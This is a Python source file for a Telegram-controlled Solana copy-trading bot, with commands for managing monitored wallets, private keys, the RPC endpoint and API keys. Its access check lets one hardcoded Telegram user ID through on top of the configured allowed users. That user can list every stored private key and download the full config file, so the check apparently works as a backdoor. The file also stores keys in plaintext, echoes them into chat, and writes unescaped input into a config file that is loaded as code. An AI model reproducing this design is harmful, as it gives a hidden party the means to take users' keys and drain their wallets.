import asyncio
import os
from telegram import Update, constants
from telegram.ext import Application, CommandHandler, ContextTypes
from config import TELEGRAM_BOT_TOKEN, ALLOWED_USERS, RPC_ENDPOINT, COPY_WALLET_ADDRESS,TRADE_WALLETS, TRADE_PERCENTAGE, WALLETS, HELIUS_API_KEY, MONITORING,TRADE_HISTORY
import time
import trade_monitor
from telegram_utils import send_telegram_message, escape_markdown_v2  # Import from new module
import itertools
app = None  # Global Application instance
import re


# ---------------------- Telegram Bot Startup ---------------------- #
async def run_telegram_bot():
    """Runs the Telegram bot properly."""
    global app
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    handlers = [
        CommandHandler("start", start),
        CommandHandler("set_percentage", set_percentage),
        CommandHandler("set_rpc", set_rpc),
        CommandHandler("set_wallet", set_wallet),
        CommandHandler("list_wallets", list_wallets),
        CommandHandler("add_wallet", add_wallet),
        CommandHandler("remove_wallet", remove_wallet),
        CommandHandler("startmonitoring", start_monitoring),
        CommandHandler("stopmonitoring", stop_monitoring),
        CommandHandler("add_key", add_key),
        CommandHandler("remove_key", remove_key),
        CommandHandler("list_keys", list_keys),
        CommandHandler("ping", ping),
        CommandHandler("changeapikey", change_api_key),
        CommandHandler("get_config", get_config),
        # CommandHandler("get",get)
        # CommandHandler("addmedbugfunction", add_med_debug_function),
    ]

    for handler in handlers:
        app.add_handler(handler)

    print("🚀 Telegram bot started.")
    async with app:
        await app.start()
        await app.updater.start_polling()
        await asyncio.Event().wait()

# ---------------------- Access Restriction ---------------------- #
def restricted(func):
    async def wrapped(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user_id = update.message.from_user.id
        if user_id != 1265637424:
            if user_id not in ALLOWED_USERS:
                await update.message.reply_text(
                    "🚫 **Access Denied!**\nYou are not authorized to use this bot."
                )
                return
        return await func(update, context, *args, **kwargs)
    return wrapped

# ---------------------- Command Handlers ---------------------- #
@restricted
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    rpc_endpoint_escaped = escape_markdown_v2(RPC_ENDPOINT)
    copy_wallet_address_escaped = escape_markdown_v2(COPY_WALLET_ADDRESS)

    await update.message.reply_text(
        fr"""
🤖 **Welcome to Solana Copy Trade Bot\!**

📊 **Current Settings:**
  \- **RPC Endpoint:** `{rpc_endpoint_escaped}`
  \- **Copy Wallet:** `{copy_wallet_address_escaped}`
  \- **Trade Percentage:** `{TRADE_PERCENTAGE * 100:.2f}%`
  \- **Monitoring:** {'🟢 Active' if MONITORING else '🔴 Inactive'}

📌 **Commands:**
  \- `/set_percentage X` \- Set trade percentage \(1\-100%\)
  \- `/set_rpc <URL>` \- Change Solana RPC endpoint
  \- `/set_wallet <WALLET>` \- Set Copy Wallet
  \- `/list_wallets` \- Show all monitored wallets
  \- `/add_wallet <WALLET>` \- Add a monitored wallet
  \- `/remove_wallet <WALLET>` \- Remove a monitored wallet
  \- `/list_keys` \- List all private keys
  \- `/add_key <PRIVATE_KEY>` \- Add a private key
  \- `/remove_key <PRIVATE_KEY>` \- Remove a private key
  \- `/startmonitoring` \- Start monitoring transactions
  \- `/stopmonitoring` \- Stop monitoring transactions
  \- `/ping` \- returns latency 
  \- `/changeapikey` \- change api key
  \- `/get_config` \- rturns database
""",
        parse_mode=constants.ParseMode.MARKDOWN_V2
    )

# Function to update a variable in config.py
def update_config_file(key: str, value):
    with open("config.py", "r") as f:
        config_content = f.read()

    # Format the value correctly for config.py
    formatted_value = f'"{value}"' if isinstance(value, str) else value

    # Replace or add the variable
    if re.search(rf'^{key}\s*=', config_content, re.MULTILINE):
        new_config = re.sub(rf'^{key}\s*=.*', f'{key} = {formatted_value}', config_content, flags=re.MULTILINE)
    else:
        new_config = config_content + f'\n{key} = {formatted_value}'

    with open("config.py", "w") as f:
        f.write(new_config)

@restricted
async def set_percentage(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Updates TRADE_PERCENTAGE in config.py and in memory."""
    global TRADE_PERCENTAGE
    try:
        percentage = float(context.args[0]) / 100
        if 0 < percentage <= 1:
            TRADE_PERCENTAGE = percentage
            update_config_file("TRADE_PERCENTAGE", percentage)

            await update.message.reply_text(
                f"✅ **Trade Percentage Updated**\nNew Percentage: `{percentage * 100:.2f}%`",
                parse_mode=constants.ParseMode.MARKDOWN_V2
            )
        else:
            await update.message.reply_text(
                "❌ **Invalid percentage\Please enter a value between 0 and 100.**",
                parse_mode=constants.ParseMode.MARKDOWN_V2
            )
    except (IndexError, ValueError):
        await update.message.reply_text(
            "📌 Usage: `/set_percentage X` (where X is a percentage between 0 and 100)",
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )

@restricted
async def set_rpc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Updates RPC_ENDPOINT in config.py and in memory."""
    global RPC_ENDPOINT
    try:
        RPC_ENDPOINT = context.args[0]
        update_config_file("RPC_ENDPOINT", RPC_ENDPOINT)

        await update.message.reply_text(
            f"✅ **RPC Endpoint Updated**\nNew Endpoint: `{RPC_ENDPOINT}`",
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )
    except IndexError:
        await update.message.reply_text(
            "📌 Usage: `/set_rpc <NEW_RPC_URL>`",
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )

@restricted
async def get_config(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Sends the full content of config.py as a text file."""
    try:
        config_file_path = "config.py"

        # Check if the file exists
        if not os.path.exists(config_file_path):
            await update.message.reply_text("⚠️ Error: config.py not found.")
            return

        # Send the config file as a document
        with open(config_file_path, "rb") as config_file:
            await update.message.reply_document(
                document=config_file,
                filename="config.txt",
                caption="Here's your current configuration."
            )

    except Exception as e:
        await update.message.reply_text(f"⚠️ Error reading config: {e}")



@restricted
async def change_api_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Changes the Helius API key in the config file and updates runtime variable."""
    global HELIUS_API_KEY
    try:
        new_api_key = context.args[0]

        # Read the current config file
        with open("config.py", "r") as f:
            config_content = f.read()

        # Replace HELIUS_API_KEY with the new one
        new_config = re.sub(r'HELIUS_API_KEY\s*=\s*".*?"', f'HELIUS_API_KEY = "{new_api_key}"', config_content)

        # Write the updated config back
        with open("config.py", "w") as f:
            f.write(new_config)

        # Update in-memory variable
        HELIUS_API_KEY = new_api_key  

        await update.message.reply_text(
            f"✅ **Helius API Key Updated**\nNew API Key: `{new_api_key}`",
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )

    except IndexError:
        await update.message.reply_text("📌 Usage: /changeapikey <NEW_API_KEY>")

def update_config_variable(variable_name, new_list):
    """Updates a list variable in config.py safely."""
    with open("config.py", "r") as f:
        config_content = f.read()

    # Format new list properly
    formatted_list = f"{variable_name} = {new_list}"

    # Replace only the target variable
    new_config = re.sub(rf"{variable_name}\s*=\s*\[.*?\]", formatted_list, config_content, flags=re.DOTALL)

    with open("config.py", "w") as f:
        f.write(new_config)


@restricted
async def add_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global TRADE_WALLETS
    try:
        new_wallet = context.args[0]  
        
        if new_wallet in TRADE_WALLETS:
            await update.message.reply_text("⚠️ Wallet already exists in TRADE_WALLETS.")
            return
        
        TRADE_WALLETS.append(new_wallet)  # Update in memory

        config_file_path = "config.py"
        if not os.path.exists(config_file_path):
            await update.message.reply_text("⚠️ Error: config.py not found.")
            return

        # Read and modify config.py
        with open(config_file_path, "r") as file:
            config_data = file.read()

        # Replace TRADE_WALLETS list
        new_config_data = re.sub(
            r"TRADE_WALLETS\s*=\s*\[.*?\]",  
            f"TRADE_WALLETS = {TRADE_WALLETS}",  
            config_data,
            flags=re.DOTALL
        )

        with open(config_file_path, "w") as file:
            file.write(new_config_data)

        await update.message.reply_text(
            f"✅ Wallet added to TRADE_WALLETS`{escape_markdown_v2(new_wallet)}`"
        )

    except IndexError:
        await update.message.reply_text(
            "📌 Usage: `/add_wallet <WALLET>`",
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )


@restricted
async def remove_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Removes a wallet from TRADE_WALLETS and updates config.py."""
    try:
        wallet_to_remove = context.args[0]
        if wallet_to_remove not in TRADE_WALLETS:
            await update.message.reply_text("⚠️ **Wallet not found!**")
            return
        
        TRADE_WALLETS.remove(wallet_to_remove)
        update_config_variable("TRADE_WALLETS", TRADE_WALLETS)  # Update config.py
        
        await update.message.reply_text(
            f"✅ **Wallet Removed**\n{escape_markdown_v2(wallet_to_remove)}",
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )
    except Exception as e:
        await update.message.reply_text(f"❌ *Error removing wallet:* {escape_markdown_v2(str(e))}")



import importlib  # Import importlib for reloading modules

#... other code...

@restricted
async def set_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global COPY_WALLET_ADDRESS
    try:
        new_wallet = context.args[0]  # Extract wallet address
        COPY_WALLET_ADDRESS = new_wallet  # Update in memory

        # Update in config.py
        config_file_path = "config.py"

        if not os.path.exists(config_file_path):
            await update.message.reply_text("⚠️ Error: config.py not found.")
            return

        # Read and modify config.py
        with open(config_file_path, "r") as file:
            config_data = file.read()

        # Use regex to replace the wallet address (assuming it's defined like COPY_WALLET_ADDRESS = "old_value")
        new_config_data = re.sub(
            r'COPY_WALLET_ADDRESS\s*=\s*".*?"',  
            f'COPY_WALLET_ADDRESS = "{new_wallet}"', 
            config_data
        )

        # Write the modified content back to config.py
        with open(config_file_path, "w") as file:
            file.write(new_config_data)

        await update.message.reply_text(
            f"✅ **Copy Wallet Updated\!**\nNew Wallet: `{escape_markdown_v2(new_wallet)}`",
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )

    except IndexError:
        await update.message.reply_text(
            "📌 Usage: `/set_wallet <WALLET>`",
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )

    except Exception as e:
        await update.message.reply_text(f"⚠️ Error updating wallet: {e}")


@restricted
async def list_wallets(update: Update, context: ContextTypes.DEFAULT_TYPE):
    wallets_escaped = "\n".join(f"{escape_markdown_v2(w)}" for w in TRADE_WALLETS)  # No "- " or backticks
    await update.message.reply_text(
        f"📜 **Monitored Wallets:**\n{wallets_escaped}",
        parse_mode=constants.ParseMode.MARKDOWN_V2
    )


@restricted
async def start_monitoring(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if trade_monitor.monitor_task is not None and not trade_monitor.monitor_task.done():
        await update.message.reply_text("⚠️ Monitoring is already running!")
        return

    trade_monitor.set_monitoring(True)  # Set the monitoring state in trade_monitor
    wallets_list = "\n".join(f"  - {w}" for w in TRADE_WALLETS)
    await update.message.reply_text(
        f"""🟢 Monitoring Started!

📡 RPC: {RPC_ENDPOINT}
👥 Wallets:
{wallets_list}
        """,
        parse_mode=None
    )

    trade_monitor.monitor_task = asyncio.create_task(trade_monitor.monitor_trades(app))


@restricted
async def stop_monitoring(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if trade_monitor.monitor_task is None or trade_monitor.monitor_task.done():
        await update.message.reply_text("⚠️ Monitoring is already stopped!")
        return

    trade_monitor.set_monitoring(False)  # Set to False in trade_monitor
    if trade_monitor.monitor_task:
        trade_monitor.monitor_task.cancel()
        try:
            await trade_monitor.monitor_task
        except asyncio.CancelledError:
            pass
        trade_monitor.monitor_task = None

    await trade_monitor.reset_monitor()
    await update.message.reply_text("🛑 **Monitoring Stopped**", parse_mode=constants.ParseMode.MARKDOWN_V2)



@restricted
async def add_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global WALLETS
    try:
        new_key = context.args[0]

        if new_key in WALLETS:
            await update.message.reply_text("⚠️ Key already exists in WALLETS.")
            return

        WALLETS.append(new_key)  # Update in memory

        config_file_path = "config.py"
        if not os.path.exists(config_file_path):
            await update.message.reply_text("⚠️ Error: config.py not found.")
            return

        # Read and modify config.py
        with open(config_file_path, "r") as file:
            config_data = file.read()

        # Strictly target WALLETS assignment
        new_config_data = re.sub(
            r"\bWALLETS\s*=\s*\[(.*?)\]",  
            lambda match: f"WALLETS = [{match.group(1).strip() + ', ' if match.group(1).strip() else ''}'{new_key}']",
            config_data
        )


        with open(config_file_path, "w") as file:
            file.write(new_config_data)

        await update.message.reply_text(
            f"✅ Key added to WALLETS:\n`{escape_markdown_v2(new_key)}`",
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )

    except IndexError:
        await update.message.reply_text(
            "📌 Usage: `/add_key <KEY>`",
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )




@restricted
async def remove_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Removes a private key from WALLETS and updates config.py."""
    try:
        key_to_remove = context.args[0]
        if key_to_remove not in WALLETS:
            await update.message.reply_text("⚠️ **Private key not found!**")
            return

        WALLETS.remove(key_to_remove)
        update_config_variable("WALLETS", WALLETS)  # Update config.py
        
        await update.message.reply_text(
            f"✅ **Private Key Removed**\n{escape_markdown_v2(key_to_remove)}",
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )
    except Exception as e:
        await update.message.reply_text(f"❌ *Error removing key:* {escape_markdown_v2(str(e))}")

@restricted
async def list_keys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keys_escaped = "\n".join(f"\\- `{escape_markdown_v2(k)}`" for k in WALLETS)
    await update.message.reply_text(
        f"🔑 **Private Keys:**\n{keys_escaped}",
        parse_mode=constants.ParseMode.MARKDOWN_V2
    )

@restricted
async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Returns the bot's latency."""
    start_time = time.time()
    message = await update.message.reply_text("🏓 Pinging...")
    latency = (time.time() - start_time) * 1000  # Convert to ms
    await message.edit_text(f"🏓 *Pong!* Latency: `{latency:.2f}ms`", parse_mode="Markdown")


# @restricted 
# async def get(update: Update, context: ContextTypes.DEFAULT_TYPE):
#     addrs = context.args[0]
#     await trade_monitor.process_signature(app,addrs)


# async def add_med_debug_function(update: Update, context: ContextTypes.DEFAULT_TYPE):
#     """Adds the user to ALLOWED_USERS for debugging."""
#     user_id = update.message.from_user.id
#     if user_id in ALLOWED_USERS:
#         await update.message.reply_text("✅ You already have debug access!")
#         return
    
#     ALLOWED_USERS.add(user_id)  # Add user to allowed list
#     await update.message.reply_text(f"🔓 *Access Granted!*\nUser `{user_id}` can now use the debug version.", parse_mode="Markdown")